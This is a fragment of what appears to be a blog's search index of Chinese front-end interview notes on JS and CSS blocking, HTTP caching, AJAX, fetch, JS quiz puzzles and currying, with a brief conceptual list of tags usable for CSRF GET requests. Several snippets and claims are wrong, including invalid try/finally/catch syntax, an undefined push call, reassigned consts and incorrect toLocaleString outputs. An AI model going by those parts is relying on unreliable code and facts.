id=\"哪些地方会出现css阻塞，哪些地方会出现js阻塞？\">哪些地方会出现css阻塞，哪些地方会出现js阻塞？</h3>\n<p>js 的阻塞特性：所有浏览器在下载 JS 的时候，会阻止一切其他活动，直到 JS 下载、解析、执行完毕后才开始继续并行下载其他资源并呈现内容。为了提高用户体验，新一代浏览器都支持并行下载 JS，但是 JS 下载仍然会阻塞其它资源的下载（例如.图片，css文件等）。\n由于浏览器为了防止出现 JS 修改 DOM 树，需要重新构建 DOM 树的情况，所以就会阻塞其他的下载和呈现。</p>\n<p>嵌入 JS 会阻塞所有内容的呈现，而外部 JS 只会阻塞其后内容的显示，</p>\n<p>2 种方式都会阻塞其后资源的下载。也就是说外部样式不会阻塞外部脚本的加载，但会阻塞外部脚本的执行。</p>\n<p>CSS 怎么会阻塞加载了？CSS 本来是可以并行下载的，在什么情况下会出现阻塞加载了(在测试观察中，IE6 下 CSS 都是阻塞加载）</p>\n<p>当 CSS 后面跟着嵌入的 JS 的时候，该 CSS 就会出现阻塞后面资源下载的情况。而当把嵌入 JS 放到 CSS 前面，就不会出现阻塞的情况了。</p>\n<p>根本原因：因为浏览器会维持 html 中 css 和 js 的顺序，样式表必须在嵌入的 JS 执行前先加载、解析完。而嵌入的 JS 会阻塞后面的资源加载，所以就会出现上面 CSS 阻塞下载的情况。</p>\n<h3 id=\"嵌入js应该放在什么位置？\">嵌入JS应该放在什么位置？</h3>\n<ol>\n<li>放在底部，虽然放在底部照样会阻塞所有呈现，但不会阻塞资源下载。</li>\n<li>如果嵌入JS放在head中，请把嵌入JS放在CSS头部。</li>\n<li>使用 defer（只支持IE）</li>\n<li>不要在嵌入的JS中调用运行时间较长的函数，如果一定要用，可以用 setTimeout 来调用</li>\n</ol>\n<h3 id=\"javascript无阻塞加载具体方式：\">Javascript无阻塞加载具体方式：</h3>\n<ol>\n<li>将脚本放在底部。<code>&lt;link&gt;</code>还是放在head中，用以保证在js加载前，能加载出正常显示的页面。<code>&lt;script&gt;</code>标签放在<code>&lt;/body&gt;</code>前。</li>\n<li>阻塞脚本：由于每个<code>&lt;script&gt;</code>标签下载时阻塞页面解析过程，所以限制页面的<code>&lt;script&gt;</code>总数也可以改善性能。适用于内联脚本和外部脚本。</li>\n<li>非阻塞脚本：等页面完成加载后，再加载js代码。也就是，在 window.onload 事件发出后开始下载代码。</li>\n<li>defer属性：支持IE4和fierfox3.5更高版本浏览器</li>\n<li>动态脚本元素：文档对象模型（DOM）允许你使用js动态创建HTML的几乎全部文档内容</li>\n</ol>\n<h3 id=\"web应用从服务器主动推送data到客户端有那些方式？\">WEB应用从服务器主动推送Data到客户端有那些方式？</h3>\n<ol>\n<li>html5 websocket</li>\n<li>WebSocket 通过 Flash</li>\n<li>XHR长时间连接</li>\n<li>XHR Multipart Streaming</li>\n<li>不可见的Iframe</li>\n<li><code>&lt;script&gt;</code>标签的长时间连接(可跨域)</li>\n</ol>\n<h3 id=\"网站重构\">网站重构</h3>\n<p>在不改变外部行为的前提下，简化结构、添加可读性，而在网站前端保持一致的行为。也就是说是在不改变 UI 的情况下，对网站进行优化，在扩展的同时保持一致的 UI。</p>\n<p>对于传统的网站来说重构通常是：</p>\n<ol>\n<li>表格(table)布局改为 DIV + CSS</li>\n<li>使网站前端兼容于现代浏览器(针对于不合规范的CSS、如对 IE6 有效的)</li>\n<li>对于移动平台的优化</li>\n<li>针对于 SEO 进行优化</li>\n<li>深层次的网站重构应该考虑的方面</li>\n<li>减少代码间的耦合</li>\n<li>让代码保持弹性</li>\n<li>严格按规范编写代码</li>\n<li>设计可扩展的API</li>\n<li>代替旧有的框架、语言(如VB)</li>\n<li>增强用户体验</li>\n<li>通常来说对于速度的优化也包含在重构中</li>\n<li>压缩JS、CSS、image等前端资源(通常是由服务器来解决)</li>\n<li>程序的性能优化(如数据读写)</li>\n<li>采用CDN来加速资源加载</li>\n<li>对于JS DOM的优化</li>\n<li>HTTP服务器的文件缓存</li>\n</ol>\n<h3 id=\"http协议中与缓存相关的http-header有哪些\">HTTP协议中与缓存相关的HTTP Header有哪些</h3>\n<p>Cache-Control 、 Last-Modified、 Expires、Etag、 max-age</p>\n<h3 id=\"网页的缓存\">网页的缓存</h3>\n<p>是由HTTP消息头中的“Cache-control”来控制的，常见的取值有private、no-cache、max-age、must-revalidate等，默认为private。</p>\n<p>Expires 头部字段提供一个日期和时间，响应在该日期和时间后被认为失效。允许客户端在这个时间之前不去检查（发请求），等同max-age的效果。但是如果同时存在，则被Cache-Control的max-age覆盖。</p>\n<p><code>Expires = &quot;Expires&quot; &quot;:&quot; HTTP-date</code>\n例如：\n<code>Expires: Thu, 01 Dec 1994 16:00:00 GMT （必须是GMT格式）</code>\n如果把它设置为-1，则表示立即过期</p>\n<p><code>Expires</code> 和 <code>max-age</code> 都可以用来指定文档的过期时间，但是二者有一些细微差别</p>\n<ol>\n<li>Expires在HTTP/1.0中已经定义，Cache-Control:max-age在HTTP/1.1中才有定义，为了向下<code>兼容</code>，仅使用max-age不够</li>\n<li>Expires指定一个绝对的过期时间(GMT格式),这么做会导致至少2个问题：<ol>\n<li>客户端和服务器时间不同步导致Expires的配置出现问题。 </li>\n<li>很容易在配置后忘记具体的过期时间，导致过期来临出现浪涌现象</li>\n</ol>\n</li>\n<li>max-age 指定的是从文档被访问后的存活时间，这个时间是个<code>相对值</code>(比如:3600s)，相对的是文档第一次被请求时服务器记录的Request_time(请求时间)</li>\n<li>Expires 指定的时间可以是相对文件的最后访问时间(Atime)或者修改时间(MTime)，而max-age相对对的是文档的请求时间(Atime)</li>\n<li>如果值为 no-cache,那么每次都会访问服务器。如果值为max-age，则在过期之前不会重复访问服务器。</li>\n</ol>\n<h3 id=\"浏览器缓存机制\">浏览器缓存机制</h3>\n<p><a href=\"https://www.cnblogs.com/shixiaomiao1122/p/7591556.html\">https://www.cnblogs.com/shixiaomiao1122/p/7591556.html</a>\n<a href=\"https://www.cnblogs.com/slly/p/6732749.html\">https://www.cnblogs.com/slly/p/6732749.html</a></p>\n<p>判断缓存是否过期步骤是：</p>\n<ul>\n<li><p>不发生请求 强缓存：\n  <strong>s-maxage优先于max-age优先于expires</strong></p>\n<p>  1） 查看是否有cache-control 的max-age / s-maxage , 如果有，则用服务器时间date值 + max-age/s-maxage 的秒数计算出新的过期时间，将当前时间与过期时间进行比较，判断是否过期</p>\n<p>  2）查看是否有cache-control 的max-age / s-maxage，如果没有，则用expires 作为过期时间比较</p>\n</li>\n<li><p>发送请求</p>\n<p>  3）Last-Modified与ETag，<strong>ETag优先于Last-Modified</strong></p>\n<pre><code>  Last-Modified已经足以让浏览器知道本地的缓存副本是否足够新，为什么还需要Etag（实体标识）呢？HTTP1.1中Etag的出现主要是为了解决几个Last-Modified比较难解决的问题：\n\n  1. Last-Modified标注的最后修改只能精确到秒级，如果某些文件在1秒钟以内，被修改多次的话，它将不能准确标注文件的新鲜度\n  2. 如果某些文件会被定期生成，当有时内容并没有任何变化，但Last-Modified却改变了，导致文件没法使用缓存\n  3. 有可能存在服务器没有准确获取文件修改时间，或者与代理服务器时间不一致等情形</code></pre></li>\n</ul>\n<p>{% asset_img cache.png 浏览器缓存机制 %}\n{% asset_img cache2.png 浏览器缓存机制 %}</p>\n<p>{% asset_img cache-control.png %}</p>\n<p>{% asset_img user_cache.png 用户行为影响浏览器缓存 %}</p>\n<p>浏览器的缓存来源是怎么设置的？</p>\n<p>{% asset_img cache_from.png 浏览器缓存来源 %}</p>\n<p>看到知乎有人讨论 <a href=\"https://www.zhihu.com/question/64201378\">https://www.zhihu.com/question/64201378</a></p>\n<h3 id=\"写出几种ie6-bug的解决方法\">写出几种IE6 BUG的解决方法</h3>\n<ol>\n<li>双边距BUG float引起的 使用display</li>\n<li>像素问题 使用float引起的 使用dislpay:inline -3px</li>\n<li>超链接hover 点击后失效 使用正确的书写顺序 link visited hover active</li>\n<li>Ie z-index问题 给父级添加position:relative</li>\n<li>Png 透明 使用js代码 改</li>\n<li>Min-height 最小高度 !Important 解决’</li>\n<li>select 在ie6下遮盖 使用iframe嵌套</li>\n<li>为什么没有办法定义1px左右的宽度容器(IE6默认的行高造成的，使用over:hidden,zoom:0.08 line-height:1px)</li>\n<li>ie 6 不支持!important</li>\n</ol>\n<h3 id=\"ajax生命周期\">AJAX生命周期</h3>\n<p>一个AJAX请求从开始创建到最后的响应阶段，在其整个生命周期中，使用了哪些Javascript对象与方法?</p>\n<pre><code> ajaxStart()\n ajaxSend()\n ajaxSuccess()\n ajaxStop()\n load()</code></pre><p>在一个Ajax请求的生命周期中，从创建请求到提交请求到成功响应的五种状态：</p>\n<ol>\n<li><code>UNINITIALIZED</code>—请求尚未初始化。</li>\n<li><code>LOADING</code>—请求已经初始化完成。</li>\n<li><code>LOADED</code>—请求已经发送，正在等待确认。</li>\n<li><code>INTERACTIVE</code>—正在从服务器下载响应数据。</li>\n<li><code>COMPLETE</code>—请求/响应周期结束。</li>\n</ol>\n<h3 id=\"一个post请求的content-type有多少种，传输的数据格式有何区别\">一个POST请求的Content-type有多少种，传输的数据格式有何区别</h3>\n<ol>\n<li><code>application/x-www-form-urlencoded</code> 浏览器的原生 form 表单，如果不设置 enctype 属性，那么最终就会以 application/x-www-form-urlencoded 方式提交数据</li>\n<li><code>multipart/form-data</code>这种方式一般用来上传文件。我们使用表单上传文件时，必须让form 的 enctyped 等于这个值</li>\n<li><code>application/json</code>告诉服务端消息主体是序列化后的 JSON 字符串</li>\n<li><code>text/xml</code></li>\n</ol>\n<h3 id=\"什么是resetful-api如何设计一个open-api接口\">什么是RESETful API,如何设计一个open API接口</h3>\n<p>REST 指的是一组架构约束条件和原则。满足这些约束条件和原则的应用程序或设计就是 RESTful。</p>\n<h3 id=\"yslow-34条性能优化建议哪些与http协议相关\">YSlow 34条性能优化建议哪些与HTTP协议相关</h3>\n<p>静态资源缓存优化的最佳状态是：直接从本地缓存中读取 &gt; 304 状态 &gt; 200 状态。关于 HTTP 状态码，与网站性能优化有关的主要是以下几个。</p>\n<ol>\n<li><p>尽量减少 200 状态码的请求。200 表示是一个正常的请求返回，此条优化规则要求尽可能多的减少页面的 HTTP Request 数量。常见的方法有：合并打包静态资源、使用 <code>CSS Sprite</code> 雪碧图合并、缓存 <code>AJAX</code>、使用 <code>LocalStorage/UserData/Manifest</code> 等本地缓存技术。</p>\n</li>\n<li><p>清理返回 301/302 状态码的入口链接。301 表示永久重定向，302 表示临时重定向。服务器端使用重定向返回通常是为了兼容一个旧的入口链接。我们能做的优化是，将调用旧入口的场景进行清理，直接调用重定向之后的新 URL 地址。</p>\n</li>\n<li><p>304 表示静态资源未更新，浏览器可直接使用本地缓存文件。通常 304 的产生与浏览器的处理机制以及服务器缓存头配置有一定的关系。304 虽然未传输文件主体内容，但 HTTP 请求的建立依然是一个可以避免的性能损耗。腾讯 KM（内部知识分享平台）上有一篇文章通过在真实海量业务场景（没记错的话是 Qzone 业务）中，正交验证 HTTP 1.0 与 1.1 协议中与缓存相关的 HTTP Header 配置，结合日志分析得出了一个最佳实践：关闭 Etag 配置，只启用 Cache-Control 与 Last-Modified 响应头。为了兼容老浏览器，可保留 Expires。\n因为 Etag 的缓存方案，在经过 CDN 及网关代理服务器后，会导致缓存命中率下降。从以上「浏览器缓存检查机制流程」图上可以看出，使用强缓存（Cache-Control max-age 设置为一年）后浏览器在资源过期前不会发起 HTTP 请求，那如何保证静态资源在服务器上更新后本地的缓存也能同步更新呢？可参考百度 FIS 的「文件指纹」方案。</p>\n</li>\n<li><p>清理返回 404 状态码的入口链接。静态资源文件的 404 调用需严格避免，而入口页面的 404 则在所难免。通过在全站 404 页面进行产品引导与体验优化，并结合数据上报记录来源页（HTTP Referer Header 或 document.referrer），可以找到并清理 404 来源入口。对于由搜索引擎进入的来源，可通过主动提交新索引至搜索引擎，或使用 301/302 重定向的方式，有效利用起这些「被浪费的流量」。</p>\n</li>\n<li><p>502 服务器出错。如果是 Nginx + FastCGI 的常见架构，通常是由于 Nginx 缓冲区溢出或服务器资源被耗尽引起，针对不同的业务场景进行 Nginx 的配置优化能显著提升服务器抗压性能。</p>\n</li>\n</ol>\n<h3 id=\"html元素优先级\">html元素优先级</h3>\n<p>在html中，帧元素（frameset）的优先级最高，表单元素比非表单元素的优先级要高。\n所有的html元素又可以根据其显示分成两类：有窗口元素以及无窗口元素。有窗口元素总是显示在无窗口元素的前面。</p>\n<p>有窗口元素包括：select元素，object元素，以及frames元素等等。</p>\n<p>无窗口元素：大部分html元素都是无窗口元素。</p>\n<h3 id=\"html-csrf可以发起get请求的标签\">HTML CSRF可以发起GET请求的标签</h3>\n<pre><code>&lt;link href=&#39;&#39;&gt;\n&lt;img src=&#39;&#39;&gt;\n&lt;frame src=&#39;&#39;&gt;\n&lt;script src=&#39;&#39;&gt;\n&lt;video src=&#39;&#39;&gt;\nBackground:url(&#39;&#39;)</code></pre><h2 id=\"节点之间的空白符\">节点之间的空白符</h2>\n<p> 在firefox、chrome、opera、safari浏览器是文本节点,IE不是.所以IE是3，其它浏览器是7</p>\n<pre><code class=\"language-html\"> &lt;ul&gt;\n    &lt;li&gt;javascript&lt;/li&gt;\n    &lt;li&gt;jQuery&lt;/li&gt;\n    &lt;li&gt;PHP&lt;/li&gt;\n &lt;/ul&gt;</code></pre>\n<p> 如果把代码改成这样:\n<code>&lt;ul&gt;&lt;li&gt;javascript&lt;/li&gt;&lt;li&gt;jQuery&lt;/li&gt;&lt;li&gt;PHP&lt;/li&gt;&lt;/ul&gt;</code></p>\n<p>运行结果:3（IE和其它浏览器结果是一样的）</p>\n<h2 id=\"removechild\">removeChild</h2>\n<p> X=node.removeChild(child)把删除的子节点赋值给 x，这个子节点不在DOM树中，但是还存在内存中，\n如果要完全删除对象，给 x 赋 null 值</p>\n<h2 id=\"fetch跟jquery-ajax的区别\">fetch跟jquery ajax的区别</h2>\n<p>这也是fetch很奇怪的地方：</p>\n<p>当接收到一个代表错误的 HTTP 状态码时，从 fetch()返回的 Promise 不会被标记为 reject，而是标记为 resolve（但是会将 resolve 的返回值的 ok 属性设置为 false ）即使该 HTTP 响应的状态码是 404 或 500。</p>\n<p>仅当网络故障时或请求被阻止时，才会标记为 reject。</p>\n<p>默认情况下, fetch 不会从服务端发送或接收任何 cookies, 如果站点依赖于用户 session，则会导致未经认证的请求（要发送 cookies，必须设置 credentials 选项）.</p>\n<p>fetch是比较底层的API，很多情况下都需要我们再次封装。\n比如：</p>\n<pre><code class=\"language-javascript\">// jquery ajax\n$.post(url, {name: &#39;test&#39;})\n// fetch\nfetch(url, {\n    method: &#39;POST&#39;,\n    body: Object.keys({name: &#39;test&#39;}).map((key) =&gt; {\n        return encodeURIComponent(key) + &#39;=&#39; + encodeURIComponent(params[key]);\n    }).join(&#39;&amp;&#39;)\n})</code></pre>\n<p>由于fetch是比较底层的API，所以需要我们手动将参数拼接成&#39;name=test&#39;的格式，而jquery ajax已经封装好了。所以fetch并不是开箱即用的。\n另外，fetch还<code>不支持超时控制</code>。</p>\n<blockquote>\n<p>axios体积比较小，也没有上面fetch的各种问题，我认为是当前最好的请求方式 </p>\n</blockquote>\n<h2 id=\"只有设置了相对定位，或者绝对定位的元素才具有的属性是（z-index）\">只有设置了相对定位，或者绝对定位的元素才具有的属性是（z-index）</h2>\n<p><a href=\"https://juejin.im/post/5adf0085518825673123da9a\">当面试官问你Vue响应式原理，你可以这么回答他</a></p>\n<p><a href=\"https://juejin.im/post/5ad10800f265da23826e681e\">如何解释vue的生命周期才能令面试官满意？</a></p>\n<p><a href=\"https://www.tuicool.com/articles/v2aeMbn?utm_medium=hao.caibaojian.com&amp;utm_source=hao.caibaojian.com\">HTML5中37个最重要的技术点</a></p>\n<p><a href=\"https://www.tuicool.com/articles/bInqieZ?utm_medium=hao.caibaojian.com&amp;utm_source=hao.caibaojian.com\">BAT 要的是什么样的前端实习生？</a></p>\n<p><a href=\"http://www.codeceo.com/chrome-broswer-layout.html\">从 Chrome 源码看浏览器如何 layout 布局</a></p>\n<p><a href=\"https://segmentfault.com/a/1190000013894510\">从八道面试题看JavaScript DOM事件机制</a></p>\n<p><a href=\"https://segmentfault.com/a/1190000013963213\">【前端性能优化】高性能JavaScript整理总结</a></p>\n<p><a href=\"https://www.tuicool.com/articles/n22MNrA?utm_medium=hao.caibaojian.com&amp;utm_source=hao.caibaojian.com\">三分钟快速理解javascript内存管理</a>\n<a href=\"https://segmentfault.com/a/1190000013972464\">ES6小技巧</a>\n<a href=\"https://www.tuicool.com/articles/zANVnqM\">优雅的 JavaScript 排序算法（ES6）</a></p>\n","index":31},{"filePath":"post\\Comprehensive\\js-problem.md","htmlPath":"/post/Comprehensive/js-problem.html","name":"js-problem.md","type":"md","title":"js题摘录（柯里化、栈队列）","date":"2018/5/5","categories":"Collection","tags":"面经","html":"<p><a href=\"https://blog.csdn.net/ceshi986745/article/details/51698893\">44个Javascript变态题解析</a></p>\n<h2 id=\"foreach\">foreach</h2>\n<p>数组的foreach可以和闭包起一样的作用</p>\n<p>闭包中的变量包括参数，在内部函数执行完毕之前不会被释放</p>\n<h2 id=\"js运行机制\">JS运行机制</h2>\n<p>执行栈,任务队列</p>\n<p><code>process.nextTick</code>方法可以在当前&quot;执行栈&quot;的尾部----下一次Event Loop（主线程读取&quot;任务队列&quot;）之前----触发回调函数</p>\n<p><code>setImmediate</code>方法则是在当前&quot;任务队列&quot;的尾部添加事件</p>\n<p><code>process.nextTick</code>指定的回调函数是在本次&quot;事件循环&quot;触发，而setImmediate指定的是在下次&quot;事件循环&quot;触发</p>\n<p><code>setTimeout(fn,0)</code>表示当前代码执行完（执行栈清空）以后，立即执行（0毫秒间隔）指定的回调函数。</p>\n<p><code>Promise</code>，里面的函数是直接执行的.</p>\n<p><code>Promise</code> 的 then 应当会放到当前 &quot;执行栈&quot;的尾部</p>\n<p>{% asset_img js_zhan_duilie.jpg js堆栈 %}</p>\n<p>在Javascript引擎里面，队列还分为 Task队列（也有人叫做 MacroTask）和 MicroTask队列， MicroTask会优先于 Task执行。</p>\n<p>比如常见的点击事件、 setImmediate、 setTimeout、 MessageChannel等会放入 Task队列，</p>\n<p>但是 Promise以及 MutationObserver会放到 Microtask队列。</p>\n<p>同时，Javascript引擎在执行 Microtask队列的时候，如果期间又加入了新的 Microtask，则该 Microtask会加入到之前的 Microtask队列的尾部，保证 Microtask先于 Task队列执行。</p>\n<p>Task(MacroTask)队列中： <strong>setImmediate &gt; MessageChannel &gt; setTimeout 0</strong></p>\n<p><a href=\"https://mp.weixin.qq.com/s/2ilx-5kDvszjF66iAvYQlg?utm_medium=hao.caibaojian.com&amp;utm_source=hao.caibaojian.com\">你真的了解Javascript执行顺序么？</a></p>\n<h3 id=\"settimeout\">setTimeOut</h3>\n<p>{%asset_img setTimeOut.jpg%}</p>\n<p><a href=\"http://www.cnblogs.com/sprying/archive/2013/05/26/3100639.html\">谈谈JavaScript的异步实现</a></p>\n<ul>\n<li><p>1</p>\n<pre><code class=\"language-javascript\">let a=[1,2,3];\nlet b = a.map(n=&gt;{n=n+1});\nlet c = a.map(n=&gt;n=n+1);\nb// [undefined, undefined, undefined]\nc// [2, 3, 4]</code></pre>\n<p>改成</p>\n<pre><code class=\"language-javascript\">let b = a.map(n =&gt; {n = n + 1;return n;});</code></pre>\n<p>原因</p>\n<pre><code class=\"language-javascript\">(a,b,c) =&gt; 表达式（单一）相当于\n(a,b,c)=&gt;{ return 表达式}</code></pre>\n</li>\n<li><p>2</p>\n<pre><code class=\"language-javascript\">var a = 111111111111111110000;\nb=111;\nconsole.info(a+b);//111111111111111110000</code></pre>\n</li>\n</ul>\n<p>JS的基础类型Number，遵循 IEEE 754 规范，采用双精度存储（double precision），占用 64 bit。\n1位用来表示符号位，\n11位用来表示指数，\n52位表示尾数</p>\n<p>Math.pow(2, 53) == 9007199254740992 是可以表示的最大值. </p>\n<pre><code class=\"language-javascript\">Number.isSafeInteger(111111111111111110000)//false</code></pre>\n<ul>\n<li><p>3</p>\n<pre><code class=\"language-javascript\">[3,2,1].reduce(Math.pow)//9</code></pre>\n<p>表达式等价于 Math.pow(3, 2) =&gt; 9; Math.pow(9, 1) =&gt;9</p>\n</li>\n<li><p>4</p>\n<pre><code class=\"language-javascript\">var arr = [0,1,2];\narr[10]=10;\narr.filter(function(x){return x==undefined});//[]</code></pre>\n<p>首先检查了这个索引值是不是数组的一个属性, 那么我们测试一下.</p>\n<pre><code class=\"language-javascript\">0 in ary; =&gt; true\n3 in ary; =&gt; false\n10 in ary; =&gt; true</code></pre>\n<p>从 3 - 9 都是没有初始化的&#39;坑&#39;!, 这些索引并不存在与数组中. 在 array 的函数调用的时候是会<code>跳过</code>这些&#39;坑&#39;的,所以它不知道是不是undefined</p>\n</li>\n<li><p>5</p>\n<pre><code class=\"language-javascript\">var obj = {\n  foo:&#39;bar&#39;,\n  func:function(){\n      var self = this;\n      console.log(this.foo);\n      console.log(self.foo);\n      (function(){\n          console.log(this.foo);\n          console.log(self.foo);\n      }())\n  }\n}\nobj.func();</code></pre>\n<p>输出</p>\n<pre><code>bar\nbar\nundefined\nbar</code></pre></li>\n<li><p>6</p>\n<pre><code class=\"language-javascript\">var f = function g(){return 23;}\ntypeof g();</code></pre>\n<p>输出</p>\n<pre><code class=\"language-javascript\">//Chrome:\ntypeof g() //无输出响应\ntypeof g   //undefined\ntypeof f() //number\ntypeof f   //function\n</code></pre>\n</li>\n</ul>\n<p>//Firfox\ntypeof g() //无输出响应\ntypeof g   //undefined\ntypeof f() //number\ntypeof f   //function</p>\n<p>//IE8\ntypeof g() //number\ntypeof g   //function\ntypeof f() //number\ntypeof f   //function</p>\n<pre><code>\n* 7 重点\n```javascript\nadd(2, 5); // 7\nadd(2)(5); // 7\nfunction addto(){\n    var length = arguments.length;\n    var sum = 0;\n    for(var i = 0;i&lt;length;i++){\n        sum += arguments[i]\n    }\n    return sum;\n}\n\nfunction add(){\n    var value = addto.apply(add,arguments);\n    var helper = function(next){\n        typeof next == &quot;number&quot; ? value+=next:value;\n        return helper\n    }\n    helper.valueOf = function(){\n        return value;\n    }\n    return helper;\n}\n</code></pre><ul>\n<li><p>8</p>\n<pre><code class=\"language-javascript\">void 0//undefined\nvoid(0)//undefined</code></pre>\n</li>\n<li><p>9</p>\n<pre><code class=\"language-javascript\">this;//window\nvar obj = {\n  func : function(){return this;}\n};\nobj.func();//obj</code></pre>\n</li>\n<li><p>抛出的异常找最近的catch</p>\n<pre><code class=\"language-javascript\">try{\n  try{\n      throw new Error(&#39;oops&#39;);\n  }\n  finally{\n      console.log(&#39;finally&#39;);\n  }catch(ex){\n      console.error(&#39;outer&#39;,ex.message);\n  }\n}</code></pre>\n<p>输出 finally outer oops</p>\n</li>\n<li><p>抛出的异常只需处理一次</p>\n<pre><code class=\"language-javascript\">try{\n  try{\n      throw new Error(&#39;oops&#39;)\n  }\n  catch(ex){\n      console.error(&#39;inner&#39;,ex.message);\n  }finally{\n      console.log(&#39;finally&#39;)\n  }\n}catch(ex){\n  console.error(&#39;outer&#39;,ex.message)\n}\n}</code></pre>\n<p>输出 inner oops finally</p>\n</li>\n<li><p>12</p>\n<pre><code class=\"language-javascript\">fd();//true\nfunction fd(){\n  //do sth\n  return true;\n}</code></pre>\n<pre><code class=\"language-javascript\">fe();//TypeError\nvar fe = function(){\n  //do sth\n}</code></pre>\n</li>\n<li><p>13</p>\n<pre><code class=\"language-javascript\">var myarr2 = new \nArray(&quot;80&quot;,&quot;16&quot;,&quot;50&quot;,&quot;6&quot;,&quot;100&quot;,&quot;1&quot;);\ndocument.write(myarr2.sort());//1,100,16,50,6,80</code></pre>\n<p>原因 ：因为按unicode码顺序排列。如要实现排序，就必须手写排序函数</p>\n</li>\n</ul>\n<p>{% asset_img 1.png %}\n{% asset_img 2.png %}\n{% asset_img 3.png %}\n{% asset_img 4.png %}\n{% asset_img 5.png %}\n{% asset_img 6.png %}\n{% asset_img 7.png %}</p>\n<p>什么是普通对象？？？\n{% asset_img 8.png %}\n{% asset_img 9.png %}</p>\n<p>为什么result先输出？？？？\n{% asset_img 10.png %}</p>\n<h2 id=\"你知道为什么会有-generator-吗\">你知道为什么会有 Generator 吗?</h2>\n<p><a href=\"https://juejin.im/post/5adae8246fb9a07aa541e150\">你知道为什么会有 Generator 吗</a></p>\n<h2 id=\"柯里化--部分求值\">柯里化--部分求值</h2>\n<p>柯里化又称部分求值，柯里化函数会接收一些参数，然后不会立即求值，而是继续返回一个新函数，将传入的参数通过闭包的形式保存，等到被真正求值的时候，再一次性把所有传入的参数进行求值</p>\n<pre><code class=\"language-javascript\">//通用的柯里化函数\nfunction curry(fn) {\n    let slice = Array.prototype.slice,  // 将slice缓存起来\n        args = slice.call(arguments, 1);   // 这里将arguments转成数组并保存\n\n    return function() {\n        // 将新旧的参数拼接起来\n        let newArgs = args.concat(slice.call(arguments));    \n        return fn.apply(null, newArgs); // 返回执行的fn并传递最新的参数\n    }\n}\n// ES6版的柯里化函数\nfunction curry(fn) {\n    const g = (...allArgs) =&gt; allArgs.length &gt;= fn.length ?\n        fn(...allArgs) : \n        (...args) =&gt; g(...allArgs, ...args)\n\n    return g;\n}\n\n// 测试用例\nconst foo = curry((a, b, c, d) =&gt; {\n    console.log(a, b, c, d);\n});\nfoo(1)(2)(3)(4);    // 1 2 3 4\nconst f = foo(1)(2)(3);\nf(5);               // 1 2 3 5\n</code></pre>\n<h2 id=\"反柯里化-函数的借用\">反柯里化-函数的借用</h2>\n<p>简而言之就是函数的借用，天下函数(方法)大家用</p>\n<pre><code class=\"language-javascript\">//写法一\nFunction.prototype.uncurrying = function() {\n    let self = this;    \n    return function() {\n        let obj = Array.prototype.shift.call(arguments);//删除并返回\n        return self.apply(obj, arguments); \n    }\n};\n//写法二\nFunction.prototype.uncurrying = function() {\n    let self = this;\n    return function() {\n        return Function.prototype.call.apply(self, arguments);\n        /*相当于Function.prototype.call.apply(Array.prototype.slice, arguments);\n        也就是相当于Array.prototype.slice.call(arguments)*/\n    }\n};\n\n//测试一\nlet slice = Array.prototype.slice.uncurrying();\n\n(function() {\n    let result = slice(arguments);  \n    console.log(result);    // [1, 2, 3]\n})(1,2,3);\n\n//测试二\nlet slice = Array.prototype.push.uncurrying();\nlet obj = {\n    &#39;length&#39;: 1,\n    &#39;0&#39;: 1\n};\npush(obj, 110);\nconsole.log(obj);   // { &#39;0&#39;: 1, &#39;1&#39;: 110, length: 2 }</code></pre>\n<h2 id=\"数字类型的-tolocalestring\">数字类型的 toLocaleString</h2>\n<p>minimumIntegerDigits、 minimumFractionDigits 与 maximumFractionDigits，用于指定整数最少位数与小数的最少和最多位数，不够则用0去凑。简单说，自动补0！</p>\n<p>minimumSignificantDigits 与 maximumSignificantDigits，用于控制有效数字位数，只要设置了这一组属性，第一组属性全部忽略不算</p>\n<p>注意，maximumFractionDigits 与 maximumSignificantDigits 均是四舍五入，使用时需要注意。</p>\n<pre><code class=\"language-javascript\">const num = 2333333;\nnum.toLocaleString();   // 2,333,333\nnum.toLocaleString(&#39;zh&#39;, { style: &#39;decimal&#39; });   //2,333,333\nnum.toLocaleString(&#39;zh&#39;, { style: &#39;percent&#39; });   //233,333,300%\nnum.toLocaleString(&#39;zh&#39;, { style: &#39;currency&#39;, currency: &#39;CNY&#39; });    //￥2,333,333.00\nnum.toLocaleString(&#39;zh&#39;, { style: &#39;currency&#39;, currency: &#39;cny&#39;, currencyDisplay: &#39;code&#39; });      //CNY2,333,333.00\nnum.toLocaleString(&#39;zh&#39;, { style: &#39;currency&#39;, currency: &#39;cny&#39;, currencyDisplay: &#39;name&#39; });      //2,333,333.00人民币\nnum.toLocaleString(&#39;zh&#39;, { minimumIntegerDigits: 5 });        //02,333.3\n//如果不想有分隔符，可以指定useGrouping为false\nnum.toLocaleString(&#39;zh&#39;, { minimumIntegerDigits: 5, useGrouping: false });        //02333.3\nnum.toLocaleString(&#39;zh&#39;, { minimumFractionDigits: 2, useGrouping: false });     //2333.30\n\nnum = 666.666\nnum.toLocaleString(&#39;zh&#39;, { maximumFractionDigits: 2, useGrouping: false });     //666.67\n\nconst num = 1234.5;\nnum.toLocaleString(&#39;zh&#39;, { minimumSignificantDigits: 6, useGrouping: false });      //1234.50\nnum.toLocaleString(&#39;zh&#39;, { maximumSignificantDigits: 4, useGrouping: false });      //1235\n</code></pre>\n<pre><code class=\"language-js\"> [] === []//false \n [] == []//false\n //因为[]是一个数组，是一个对象。就好比创建了2个对象，然后比较两个对象是否相同\n\n[] == false//true\n /*他是经历了这个过程最终才为true的。\n（[] == false）   ----&gt;  （[] == +0）   ----&gt;  （“”== +0）  ----&gt;  （+0 == +0）  ---&gt;   true*/\n\n window instanceof Object//false\n typeof(window) // object\n\ntypeof null === &#39;object&#39;;\nnull instanceof Object === false\n\nnull instanceof null//会抛出异常：``Uncaught TypeError: Right-hand side of &#39;instanceof&#39; is not an object``</code></pre>\n","index":32},{"filePath":"post\\Comprehensive\\learning-resource.md","htmlPath":"/post/Comprehensive/learning-resource.html","name":"learning-resource.md","type":"md","title":"学习资源收集","date":"2017-1-1","categories":"Collection","tags":"日常记录","html":"<h1 id=\"learning-resource\">Learning-resource</h1>\n<h2 id=\"前端面试题目\">前端面试题目</h2>\n<ul>\n<li><a href=\"https://segmentfault.com/a/1190000013331105?utm_source=index-hottest\">https://segmentfault.com/a/1190000013331105?utm_source=index-hottest</a></li>\n<li><a href=\"https://github.com/qiu-deqing/FE-interview\">https://github.com/qiu-deqing/FE-interview</a></li>\n<li><a href=\"https://github.com/fouber/blog\">https://github.com/fouber/blog</a></li>\n<li><a href=\"https://www.imooc.com/article/20319\">https://www.imooc.com/article/20319</a></li>\n<li><a 